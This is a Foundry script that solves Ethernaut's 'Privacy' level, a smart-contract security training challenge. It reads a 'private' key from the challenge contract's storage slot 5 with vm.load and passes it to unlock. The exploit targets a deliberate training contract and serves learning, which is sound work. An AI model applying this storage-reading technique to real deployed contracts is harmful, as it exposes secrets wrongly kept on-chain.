// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface Privacy {
    function unlock(bytes16 _key) external;
}

// forge script script/solutions/12-Privacy.s.sol:PrivacySolution --rpc-url $SEPOLIA_RPC
contract PrivacySolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x131c3249e115491E83De375171767Af07906eA36;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    bytes32 public dataFromStorage;
    bytes32 public key;

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        // 0. create a Privacy.sol contract in /src folder
        // 1. forge inspect Privacy storage-layout --pretty
        // 2. find the exact slot that the "private" visibility data store
        // 3. use vm.load(address, bytes32) to load the data

        dataFromStorage = vm.load(address(challengeInstance), bytes32(uint256(5)));

        // 4. unlock the contract
        Privacy(challengeInstance).unlock(bytes16(dataFromStorage));

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(12));
    }
}
